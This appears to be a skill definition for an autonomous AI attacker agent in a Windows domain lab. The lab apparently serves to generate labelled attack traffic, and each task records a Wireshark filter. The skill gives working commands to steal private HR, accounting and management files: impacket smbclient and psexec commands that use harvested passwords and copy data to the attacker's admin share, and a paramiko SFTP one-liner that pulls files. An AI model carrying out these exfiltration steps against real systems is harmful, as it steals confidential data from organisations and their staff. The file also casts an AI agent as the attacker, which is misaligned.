---
name: ad-steal
description: File-theft skill for an attacker agent on a domain-joined Windows host. Copies one file from a role Desktop\role_private_files folder or from the domain controller Company_Data share. SMB is the primary method (smbclient pull, or a PsExec SMB copy). SFTP is the fallback for a role desktop folder when port 22 is open. Load this skill when the task names ad-steal. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
---

# AD File Theft Skill

Load this skill **only** when the dispatched task names `ad-steal`. Do not load other phase catalogs.

**Shared runtime.** `cd` to `~/.config/opencode/skills/ad-attack` (or the packaged `attacker/skills/ad-attack`) before any `python scripts/...` call. Follow the Mandatory Execution Protocol in the `ad-attack` skill, including Step 5 (write `{task_id}.txt`).

**Traffic filter contract.** Time-window slicing is a later extract step. This skill writes **only** a Wireshark display filter — never a tshark command, never `frame.time_epoch`. Copy the technique Template and replace angle brackets only. The shapes in ad-attack Step 5 are: one address pair; a domain-controller clause joined with `||` to a target clause; or one subnet sweep. Do not list every scanned host. Do not put three `ip.addr` tests in one `&&` group.

**Path constraint.** Copy only from one of these locations. Do not read any other folder. Do not invent a filename. If the path is a directory, list it and copy one file found there. If the path is a file, copy that file only.

- Role desktop: `C:\Users\<profile>\Desktop\role_private_files`. `<profile>` is `hr`, `manager`, `accountancy`, or `programmer`. Target is that role host.
- Domain controller file share: `\\<dc_ip>\Company_Data` and its folders `HR-Private`, `Public`, `Exchange`, `accountancy`, `IT-Dev`, and `Management`. The domain controller is also the SMB file server. Target is `domain.dc_ip`. Use SMB (`steal.smb` or `steal.psexec`) for this share. Do not use `steal.sftp` for `Company_Data`.
- Prior fact. The file server refuses a department account on any folder except its own department folder, `Public`, and `Exchange`: `hr` → `HR-Private`; `programmer` → `IT-Dev`; `accountancy` → `accountancy`; `manager` → `Management`. `hr` is refused on `IT-Dev`. The same account is refused on the `Company_Data` root and on another role's `Desktop\role_private_files`. `Administrator` is not refused on a `Company_Data` folder. Copy only a path this account can open.

**Protocol order.** Use the technique named in the task. `steal.smb` is the primary pull. `steal.psexec` is the other SMB method. `steal.sftp` is only for a host that already lists port 22.

# File theft

## 1. SMB pull

- Technique id: `steal.smb`
- ATT&CK: T1021.002 (SMB/Windows Admin Shares), T1005 (Data from Local System)

Purpose: copy one file from `Desktop\role_private_files` or from the domain controller `Company_Data` share to this attacker host over SMB.

Inputs: a user object with `password` from `users`, the target host, and the `path` intent.

Procedure (one atomic action — one `smbclient` session):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-ip>
```

Inside, choose the share from the path, then `exit`.

- `Desktop\role_private_files`: `use C$`. If `path` is the directory, `cd` to `Users\<profile>\Desktop\role_private_files`, `ls`, then `get` one listed file. If `path` is a file, `get` `Users\<profile>\Desktop\role_private_files\<file>`.
- `Company_Data`: `use Company_Data`. If `path` is the share root or one of `HR-Private`, `Public`, `Exchange`, `accountancy`, `IT-Dev`, or `Management`, `cd` to that folder, `ls`, then `get` one listed file. If `path` is a file, `get` the path relative to `Company_Data`.

Outputs:

```
python scripts/state.py add files '{"path": "<local-download-path>", "description": "stole <remote-path> from <target-ip> via SMB"}'
```

Set `"collected": true` on the matching `hosts[].discovered_files` entry when that path is already listed, and write the list back with `state.py set`.

Rollback: if the login or the path fails, mark the technique `failed`. Do not search other folders.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Copy the Template and replace only `<attacker-ip>`, `<dc-ip>`, `<target-ip>`, `<lab-cidr>`, and `<listener-ip>`. Do not move any `||` outside its parentheses. A same-task extra action is another complete clause joined with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
(ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)) || (ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139))
```


## 2. SMB copy via PsExec

- Technique id: `steal.psexec`
- ATT&CK: T1021.002 (SMB/Windows Admin Shares), T1005 (Data from Local System)

Purpose: copy the same role file over SMB by starting the copy from a PsExec session. Use this when `steal.smb` for this path is already in `executed_today`, or when the task names this technique.

Inputs: a user object with `password` from `users`, the target host, the `path` intent, and this attacker host's own IP.

Procedure (one atomic action):

```
python -m impacket.examples.psexec <domain.name>/<user>:<password>@<target-ip> "cmd /c copy /Y <quoted-remote-path> \\<attacker-ip>\C$\Windows\Temp\<filename>"
```

`<quoted-remote-path>` is the task path. For `Company_Data`, quote the UNC `\\<dc_ip>\Company_Data\...` path. If the path is a directory, first resolve one filename with a read-only `dir` of that directory in the same PsExec command, then `copy` that one file. Do not open a new share. If the attacker admin share rejects the copy, mark the technique `failed`.

Outputs:

```
python scripts/state.py add files '{"path": "C:\\Windows\\Temp\\<filename>", "description": "stole <remote-path> from <target-ip> via PsExec SMB copy"}'
```

Set `"collected": true` on the matching `discovered_files` entry when present.

Rollback: if PsExec or the copy fails, mark the technique `failed`. Do not fall through to another technique in this task.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Copy the Template and replace only `<attacker-ip>`, `<dc-ip>`, `<target-ip>`, `<lab-cidr>`, and `<listener-ip>`. Do not move any `||` outside its parentheses. A same-task extra action is another complete clause joined with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
(ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)) || (ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139))
```


## 3. SFTP pull

- Technique id: `steal.sftp`
- ATT&CK: T1021.004 (Remote Services: SSH), T1048 (Exfiltration Over Alternative Protocol)

Purpose: copy one file from `Desktop\role_private_files` over SFTP. Use only when that role host lists port 22. Do not use this technique for `Company_Data`; that share is SMB. If the connection is refused, mark `failed`. Do not start an SFTP server.

Inputs: a user object with `password` from `users`, the target host, and the `path` intent.

Procedure (one atomic action). Read the password from `users` via `state.py`; do not put it in the task text.

```
python -c "import paramiko; t=paramiko.Transport(('<target-ip>', 22)); t.connect(username=r'<domain.name>\<user>', password='<password>'); s=paramiko.SFTPClient.from_transport(t); s.get(r'<remote-path>', r'<local-name>'); s.close(); t.close()"
```

If `path` is the directory, `listdir` that directory and `get` one file. Connection refused or missing `paramiko` → `failed`.

Outputs:

```
python scripts/state.py add files '{"path": "<local-name>", "description": "stole <remote-path> from <target-ip> via SFTP"}'
```

Set `"collected": true` on the matching `discovered_files` entry when present.

Rollback: close the transport, then mark `failed`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Copy the Template and replace only `<attacker-ip>`, `<dc-ip>`, `<target-ip>`, `<lab-cidr>`, and `<listener-ip>`. Do not move any `||` outside its parentheses. A same-task extra action is another complete clause joined with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
(ip.addr == <attacker-ip> && ip.addr == <target-ip>) && (tcp.port == 22)
```
